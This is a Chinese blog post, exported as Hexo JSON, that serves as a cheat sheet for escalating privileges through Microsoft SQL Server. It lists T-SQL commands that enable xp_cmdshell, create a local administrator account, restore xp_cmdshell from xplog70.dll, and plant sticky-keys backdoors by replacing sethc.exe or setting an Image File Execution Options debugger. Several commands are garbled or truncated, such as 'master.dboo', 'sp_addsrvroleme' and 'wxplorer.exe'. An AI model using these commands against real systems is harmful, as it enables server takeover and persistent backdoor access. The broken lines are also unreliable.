{"title":"MS-SQL提权","slug":"MS-SQL提权","date":"2018-09-26T09:39:39.000Z","updated":"2018-10-05T14:34:34.860Z","comments":true,"path":"api/articles/MS-SQL提权.json","photos":[],"link":"","excerpt":"SQL Server 数据库漏洞利用与提权","covers":["https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Equity/sqlserver_zongjie.png","https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Equity/koulign_hq.png"],"content":"<h1 id=\"SQL-Server-数据库漏洞利用与提权\"><a href=\"#SQL-Server-数据库漏洞利用与提权\" class=\"headerlink\" title=\"SQL Server 数据库漏洞利用与提权\"></a>SQL Server 数据库漏洞利用与提权</h1><a id=\"more\"></a>\n<p><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Equity/sqlserver_zongjie.png\" alt=\"ms提权总结\"></p>\n<h3 id=\"SQL-Server提权基础\"><a href=\"#SQL-Server提权基础\" class=\"headerlink\" title=\"SQL Server提权基础\"></a>SQL Server提权基础</h3><p><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Equity/koulign_hq.png\" alt=\"懒得打字了\"></p>\n<h3 id=\"常用语句\"><a href=\"#常用语句\" class=\"headerlink\" title=\"常用语句\"></a>常用语句</h3><h4 id=\"语句一\"><a href=\"#语句一\" class=\"headerlink\" title=\"语句一\"></a>语句一</h4><blockquote>\n<p>查看数据库版本<br><code>select @@version</code><br>查看数据库系统参数<br><code>exec master..xp_msver;</code><br>查看用户所属角色信息<br><code>sp_helpsrvrolemember</code><br>查看当前数据库<br><code>select db_name()</code><br>显示机器上的驱动器<br><code>xp_availablemedia</code></p>\n</blockquote>\n<h4 id=\"语句二\"><a href=\"#语句二\" class=\"headerlink\" title=\"语句二\"></a>语句二</h4><p>查看当前账户权限<br><code>select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code><br><code>以下类似 serveradmin、setupadmin、securityadmin、diskadmin</code><br><code>select IS_MEMBER(&#39;db_owner&#39;)</code><br>添加用户<br><code>exec master.dbo.sp_addlogin test,password</code><strong>添加用户</strong><br><code>exec master.dbo.sp_addsrvroleme</code><strong>添加权限</strong><br>启动停止服务<br><code>exec master..xp_servicecontrol &#39;stop&#39;,&#39;test&#39;</code><br><code>exec master..xp_servicecontrol &#39;start&#39;,&#39;test&#39;</code><br>检查功能<br><code>SELECT count(*) FROM master.dbo.sysobjects WHERE name=&#39;xp_cmdshell&#39;</code><br><code>xp_cmdshell、xp_regread、sp_makewebtask</code></p>\n<h4 id=\"语句三\"><a href=\"#语句三\" class=\"headerlink\" title=\"语句三\"></a>语句三</h4><p><strong>xp_cmdshell</strong><br>开启xp_cmdshell存储过程<br><code>EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;</code><br><code>EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;</code><br>关闭xp_cmdshell存储过程<br><code>EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;</code><br><code>EXEC sp_configure &#39;xp_cmdshell&#39;,0;RECONFIGURE;</code><br>xp_cmdshell执行命令<br><code>exec master..xp_cmdshell &#39;ver&#39;</code><br><code>exec master.dboo.xp_cmdshell &#39;net user test test /add&#39;</code><br><code>exec master.dbo.xp_cmdshell &#39;net localgroup administrators test /add&#39;</code><br>恢复xp_cmdshell<br><code>exec sp_dropextendedproc &#39;xp_cmdshell&#39;</code><br><code>dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;) OR dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;d:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll&quot;);EXEC sp_configure &#39;show advanced options&#39;,0 --</code></p>\n<h4 id=\"语句四\"><a href=\"#语句四\" class=\"headerlink\" title=\"语句四\"></a>语句四</h4><p>sp_oacreate替换粘贴键<br><code>declare @o int;exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out</code><br><code>exec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\\windows\\wxplorer.exe&#39;,&#39;c:\\windows\\system32\\sethc.exe&#39;;</code><br><code>declare @oo int</code><br><code>exec sp_oacreate &#39;scripting.filesystemobject&#39;,@oo out exec sp_oamethod @oo,&#39;copyfile&#39;,null,&#39;c:\\windows\\system32\\dllcache\\sethc.exe&#39;;</code></p>\n<h4 id=\"语句五\"><a href=\"#语句五\" class=\"headerlink\" title=\"语句五\"></a>语句五</h4><p>注册表篡改-劫持粘贴键<br><code>exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&#39;,&#39;debugger&#39;,&#39;reg_sz&#39;,&#39;c:\\windows\\explorer.exe&#39;</code></p>\n","categories":[],"tags":[{"name":"tiquan","slug":"tiquan","count":6,"path":"api/tags/tiquan.json"}]}